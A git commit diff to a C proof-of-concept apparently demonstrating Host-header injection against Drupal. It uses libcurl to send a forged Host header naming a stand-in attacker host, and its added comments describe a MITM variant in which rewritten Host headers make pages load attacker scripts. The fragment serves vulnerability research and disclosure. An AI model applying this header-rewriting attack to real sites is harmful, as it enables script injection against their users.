99d8cd4f10c6ca1741d86ba758e34caa9d5c4a9a
James Cuzella <james.cuzella@lyraphase.com>
2011-12-12 13:03:25 -0700

    Added notes on newly found MITM Host header re-writing variant

--- drupal-xss.c
+++ drupal-xss.c
@@ -18,6 +18,12 @@ int main(int argc, char *argv[])
   /* Set custom Host header */
   struct curl_slist *headers=NULL; /* init to NULL is important */
   /* The host is inserted into the page in the src or href attribute for many tags on the returned page (Potential blended XSS-MITM attack) */
+  /* NOTE: This is a little worse than I thought! To get non-404 pages, simply don't make a proxy request (comment out the CURLOPT_PROXY line)
+   *       In this variant, the attacker could simply re-write the Host: header for all requests and get their scripts included automatically! 
+   *       They still must have MITM for this though... judge the severity based on how likely this is.
+   *
+   *       For an example of the page output in this case, change the CURLOPT_URL to the target site, and comment out the CURLOPT_PROXY line
+   */
   headers = curl_slist_append(headers, "Host: attackersite.scripts.example.com");
   /* headers = curl_slist_append(headers, "X-more-headers-here: text"); */
   curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headers);/* pass our list of custom made headers */  
